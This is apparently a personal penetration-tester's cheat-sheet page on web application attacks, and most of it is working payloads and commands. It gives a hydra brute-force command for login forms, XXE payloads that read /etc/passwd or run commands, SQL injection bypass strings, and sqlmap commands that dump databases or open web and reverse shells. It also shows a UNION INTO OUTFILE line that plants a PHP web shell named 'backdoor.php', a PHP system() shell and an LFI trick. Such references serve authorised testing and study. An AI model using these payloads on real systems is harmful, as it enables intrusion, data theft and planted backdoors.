---
layout: page
title: Web App
permalink: /web/
---

# Index

* [Authentication](#authentication)
* [Session Management](#session-management)
* [XML External Entity](#xml-external-entity)
* [SQL Injection](#sql-injection)
* [PHP Injection](#php-injection)
* [Cross Site Scripting](#cross-site-scripting)
* [Deserialization](#deserialization)
* [Other Tools](#other-tools)
* [Methodology](#methodology)

## Authentication

### Brute Forcing Online

`hydra`

For example attacking a web login form

`hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt`

---

## Session Management

---

## XML External Entity

Local file inclusion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Remote code exectuion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
Above is just proof of concept, other functions exist.

---

## SQL Injection

Suppose a SQL query like below, where parameters are received from user input

```SQL
SELECT id FROM users WHERE username='$username' AND password='$password';
```

If we managed to input data like below we could return unintended data.

```SQL
SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
```

We can also save a request in burp and feed it into `sqlmap` or fuzz with `sqlmap` directly.

```
sqlmap
# sqlmap crawl  
sqlmap -u http://10.10.10.10 --crawl=1

# sqlmap dump sql database from saved request
sqlmap -r login.req --dbms=mysql --dump

# sqlmap web shell  
sqlmap -r login.req --os-shell

# sqlmap reverse shell
sqlmap -r login.req --os-pwn

SQL Injection Writing a file

```SQL
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

SQL Injection Reading a File

```SQL
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

SQL Fuzzing Strings

```SQL
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
```
---

## PHP Injection

If we can inject the below string anywhere interpreted as php we get RCE.

`<?php system($_GET['cmd']); ?>`

If there is LFI the below might work

`site.php?lfi_path=php://input%00`

Other things to try https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

---

## Cross Site Scripting

Wherever user input is reflect in the site test for XSS with:

``` Javascript
    <script>alert('x')</script>
```

---

## Deserialization

---

## Other Tools

* w3af - Web Application Scanner
* wpscan - Scan wordpress
* droopscan - scan Drupal & Silverstripe CMS
* cewl - Scraping for strings

## Methodology

See:
* The Web Application Hacker's Handbook - Chapter 21
* https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/
